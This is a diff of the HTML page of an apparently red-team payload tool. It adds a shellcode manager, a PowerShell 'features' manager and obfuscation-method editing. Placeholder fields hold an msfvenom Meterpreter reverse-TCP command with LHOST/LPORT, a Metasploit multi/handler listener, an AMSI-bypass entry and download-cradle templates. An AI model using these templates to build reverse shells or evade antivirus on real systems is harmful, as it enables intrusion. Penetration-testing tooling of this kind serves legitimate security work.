@@ -117,6 +117,12 @@
             <span id="category-count">Categories: 0</span>
         </div>
         <div class="header-actions">
+            <button id="shellcode-mgr-btn" class="btn btn-secondary">
+                <span class="btn-icon">💉</span> Shellcodes
+            </button>
+            <button id="ps-features-btn" class="btn btn-secondary">
+                <span class="btn-icon">🛡️</span> PS Features
+            </button>
             <button id="obfuscate-ps-btn" class="btn btn-secondary">
                 <span class="btn-icon">🔒</span> Obfuscate PS
             </button>
@@ -300,12 +306,14 @@
 
     <!-- Obfuscate PowerShell Modal -->
     <div id="obfuscate-ps-modal" class="modal">
-        <div class="modal-content">
+        <div class="modal-content editor-modal">
             <div class="modal-header">
-                <h2>PowerShell Obfuscator</h2>
+                <h2 id="ps-obf-modal-title">PowerShell Obfuscator</h2>
                 <button class="modal-close">&times;</button>
             </div>
             <div class="modal-body">
+                <!-- Main obfuscation view -->
+                <div id="ps-obf-main-view">
                 <div class="obfuscate-ps-container">
                     <div class="obfuscate-ps-input-section">
                         <label class="obfuscate-ps-label">PowerShell Command</label>
@@ -408,9 +416,45 @@
                         <p>Obfuscating PowerShell...</p>
                     </div>
                 </div>
+                </div><!-- end ps-obf-main-view -->
+
+                <!-- Method list view -->
+                <div id="ps-obf-list-view" style="display:none;">
+                    <div class="shellcode-mgr-toolbar" style="padding-bottom: 0.75rem;">
+                        <button id="ps-obf-create-btn" class="btn btn-primary btn-sm">+ New Method</button>
+                    </div>
+                    <div id="ps-obf-method-list" style="padding: 0 1.5rem 1rem; overflow-y: auto; flex: 1; min-height: 0;">
+                        <!-- Method cards rendered by JS -->
+                    </div>
+                </div>
+
+                <!-- Method editor view -->
+                <div id="ps-obf-editor-view" style="display:none;">
+                    <div style="padding: 1rem 1.5rem; overflow-y: auto; flex: 1; min-height: 0;">
+                        <div class="editor-field">
+                            <label>Method Name <span style="color: var(--red);">*</span></label>
+                            <input type="text" id="ps-obf-editor-name" class="param-form-input" placeholder="e.g. PSObf - High obfuscation">
+                        </div>
+                        <div class="editor-field">
+                            <label>Command Template <span style="color: var(--red);">*</span></label>
+                            <textarea id="ps-obf-editor-command" class="param-form-input" rows="8" style="font-family: 'Consolas', 'Monaco', 'Courier New', monospace; font-size: 0.85rem; resize: vertical;" placeholder="psobf -i {temp} -o {out} -level 3 -seed {seed}"></textarea>
+                            <div class="param-form-hint">
+                                Available variables: {temp} (input file), {out} (output file), {hex_key}, {string_dict}, {dead_code}, {seed}
+                            </div>
+                        </div>
+                    </div>
+                </div>
             </div>
-            <div class="modal-footer">
+            <div class="modal-footer" id="ps-obf-footer-main">
+                <button id="ps-obf-manage-btn" class="btn btn-secondary">Manage Methods</button>
                 <button id="close-obfuscate-ps-btn" class="btn btn-secondary">Close</button>
+            </div>
+            <div class="modal-footer" id="ps-obf-footer-list" style="display:none;">
+                <button id="ps-obf-list-back-btn" class="btn btn-secondary">Back</button>
+            </div>
+            <div class="modal-footer" id="ps-obf-footer-editor" style="display:none;">
+                <button id="ps-obf-editor-cancel-btn" class="btn btn-secondary">Cancel</button>
+                <button id="ps-obf-editor-save-btn" class="btn btn-primary">Save Method</button>
             </div>
         </div>
     </div>
@@ -555,6 +599,194 @@
                 <div class="editor-footer-buttons">
                     <button id="editor-cancel-btn" class="btn btn-secondary">Cancel</button>
                     <button id="editor-save-btn" class="btn btn-primary">Save</button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Modal: Shellcode Manager -->
+    <div id="shellcode-mgr-modal" class="modal">
+        <div class="modal-content editor-modal">
+            <div class="modal-header">
+                <h2 id="shellcode-mgr-title">Shellcode Manager</h2>
+                <button class="modal-close">&times;</button>
+            </div>
+
+            <!-- List View -->
+            <div id="shellcode-mgr-list-view">
+                <div class="shellcode-mgr-toolbar">
+                    <button id="shellcode-mgr-create-btn" class="btn btn-primary btn-sm">+ New Shellcode</button>
+                </div>
+                <div class="modal-body">
+                    <div id="shellcode-mgr-list"></div>
+                </div>
+            </div>
+
+            <!-- Editor View -->
+            <div id="shellcode-mgr-editor-view" style="display:none;">
+                <div class="modal-body">
+                    <div class="editor-field-row">
+                        <div class="editor-field" style="flex:1;">
+                            <label>Name *</label>
+                            <input type="text" id="sc-editor-name" placeholder="e.g., Msfvenom Meterpreter Reverse TCP">
+                        </div>
+                    </div>
+                    <div class="editor-field">
+                        <label>Shellcode Command *</label>
+                        <textarea id="sc-editor-command" class="code-textarea" rows="4" placeholder="e.g., msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f raw"></textarea>
+                    </div>
+                    <div class="editor-field">
+                        <label>Listener Command</label>
+                        <textarea id="sc-editor-listener" class="code-textarea" rows="3" placeholder="Optional: e.g., msfconsole -x &quot;use exploit/multi/handler; ...&quot;"></textarea>
+                    </div>
+                    <div class="editor-field">
+                        <label>Parameters</label>
+                        <div id="sc-editor-params-list"></div>
+                        <button class="editor-list-add" id="sc-editor-add-param">+ Add Parameter</button>
+                    </div>
+                </div>
+                <div class="editor-footer">
+                    <div style="flex:1;"></div>
+                    <div class="editor-footer-buttons">
+                        <button id="sc-editor-cancel-btn" class="btn btn-secondary">Cancel</button>
+                        <button id="sc-editor-save-btn" class="btn btn-primary">Save</button>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Generate View -->
+            <div id="shellcode-mgr-generate-view" style="display:none;">
+                <div class="modal-body">
+                    <div id="sc-generate-params-container"></div>
+                    <div id="sc-generate-result" style="display:none;">
+                        <div class="editor-field">
+                            <label>Generated Shellcode</label>
+                            <div class="sc-generate-info">
+                                <span id="sc-generate-size"></span>
+                            </div>
+                            <div class="sc-code-block">
+                                <button class="sc-copy-btn btn btn-secondary btn-sm" id="sc-generate-copy-hex" title="Copy">Copy</button>
+                                <textarea id="sc-generate-output-hex" class="code-textarea" rows="8" readonly></textarea>
+                            </div>
+                        </div>
+                        <div class="sc-generate-save-controls">
+                            <label class="param-form-label" style="font-size:0.85rem;margin-bottom:0;white-space:nowrap;">Filename:</label>
+                            <input type="text" id="sc-generate-save-filename" class="sc-filename-input" placeholder="shellcode.bin">
+                            <button id="sc-generate-save-btn" class="btn btn-secondary btn-sm">Save</button>
+                        </div>
+                        <div id="sc-generate-save-status" class="sc-save-status" style="display:none;"></div>
+                        <div id="sc-generate-listener-section" style="display:none;">
+                            <div class="editor-field">
+                                <label>Listener Command</label>
+                                <div class="sc-code-block">
+                                    <button class="sc-copy-btn btn btn-secondary btn-sm" id="sc-generate-copy-listener" title="Copy">Copy</button>
+                                    <textarea id="sc-generate-listener-cmd" class="code-textarea" rows="2" readonly></textarea>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                <div class="modal-footer">
+                    <button id="sc-generate-back-btn" class="btn btn-secondary">Back</button>
+                    <div style="flex:1;"></div>
+                    <button id="sc-generate-btn" class="btn btn-primary">Generate</button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Modal: PS Features Manager -->
+    <div id="ps-features-modal" class="modal">
+        <div class="modal-content editor-modal">
+            <div class="modal-header">
+                <h2 id="ps-feat-modal-title">PS Features Manager</h2>
+                <button class="modal-close">&times;</button>
+            </div>
+
+            <!-- List View -->
+            <div id="ps-feat-list-view">
+                <div class="shellcode-mgr-toolbar" style="padding-bottom: 0.75rem;">
+                    <button id="ps-feat-create-btn" class="btn btn-primary btn-sm">+ New Feature</button>
+                </div>
+                <div class="modal-body">
+                    <div id="ps-feat-list"></div>
+                </div>
+            </div>
+
+            <!-- Editor View -->
+            <div id="ps-feat-editor-view" style="display:none;">
+                <div class="modal-body">
+                    <div class="editor-field-row">
+                        <div class="editor-field" style="flex:2;">
+                            <label>Name <span style="color: var(--red);">*</span></label>
+                            <input type="text" id="ps-feat-editor-name" class="param-form-input" placeholder="e.g. AmsiInitialize">
+                        </div>
+                        <div class="editor-field" style="flex:1;">
+                            <label>Type <span style="color: var(--red);">*</span></label>
+                            <select id="ps-feat-editor-type" class="param-form-select">
+                                <option value="amsi">amsi</option>
+                                <option value="cradle-ps1">cradle-ps1</option>
+                                <option value="cradle-exe">cradle-exe</option>
+                                <option value="cradle-dll">cradle-dll</option>
+                            </select>
+                        </div>
+                    </div>
+                    <div style="padding: 0.75rem; background-color: var(--surface1); border-radius: 4px; margin-bottom: 1rem;">
+                        <label class="param-form-checkbox-label">
+                            <input type="checkbox" id="ps-feat-editor-no-obf" class="param-form-checkbox">
+                            No Obfuscation (skip obfuscation for this feature)
+                        </label>
+                    </div>
+                    <div class="editor-field">
+                        <label>Code</label>
+                        <textarea id="ps-feat-editor-code" class="param-form-input" rows="8" style="font-family: 'Consolas', 'Monaco', 'Courier New', monospace; font-size: 0.85rem; resize: vertical;" placeholder="Inline PowerShell code template"></textarea>
+                        <div class="param-form-hint">
+                            PowerShell code template. Variables: {url}, {output_file}, {lhost}, {namespace}, {class}, {entry_point}, {args}
+                        </div>
+                    </div>
+                    <div class="editor-field">
+                        <label>Command</label>
+                        <textarea id="ps-feat-editor-command" class="param-form-input" rows="4" style="font-family: 'Consolas', 'Monaco', 'Courier New', monospace; font-size: 0.85rem; resize: vertical;" placeholder="Shell command to generate the code (optional)"></textarea>
+                        <div class="param-form-hint">
+                            Shell command executed server-side to generate code (e.g. CradleCrafter). Same variables available.
+                        </div>
+                    </div>
+                </div>
+                <div class="editor-footer">
+                    <div style="flex:1;"></div>
+                    <div class="editor-footer-buttons">
+                        <button id="ps-feat-editor-cancel-btn" class="btn btn-secondary">Cancel</button>
+                        <button id="ps-feat-editor-save-btn" class="btn btn-primary">Save</button>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Generate View -->
+            <div id="ps-feat-generate-view" style="display:none;">
+                <div class="modal-body">
+                    <div id="ps-feat-generate-params-container">
+                        <!-- Dynamic parameter form or direct output -->
+                    </div>
+                    <div id="ps-feat-generate-result" style="display:none;">
+                        <div class="editor-field">
+                            <label>Output</label>
+                            <div class="sc-code-block">
+                                <button class="sc-copy-btn btn btn-secondary btn-sm" id="ps-feat-generate-copy" title="Copy">Copy</button>
+                                <textarea id="ps-feat-generate-output" class="code-textarea" rows="10" readonly></textarea>
+                            </div>
+                        </div>
+                        <div class="sc-generate-save-controls">
+                            <label class="param-form-label" style="font-size:0.85rem;margin-bottom:0;white-space:nowrap;">Filename:</label>
+                            <input type="text" id="ps-feat-generate-save-filename" class="sc-filename-input" placeholder="output.ps1">
+                            <button id="ps-feat-generate-save-btn" class="btn btn-secondary btn-sm">Save</button>
+                        </div>
+                        <div id="ps-feat-generate-save-status" class="sc-save-status" style="display:none;"></div>
+                    </div>
+                </div>
+                <div class="modal-footer">
+                    <button id="ps-feat-generate-back-btn" class="btn btn-secondary">Back</button>
+                    <div style="flex:1;"></div>
+                    <button id="ps-feat-generate-btn" class="btn btn-primary">Generate</button>
                 </div>
             </div>
         </div>
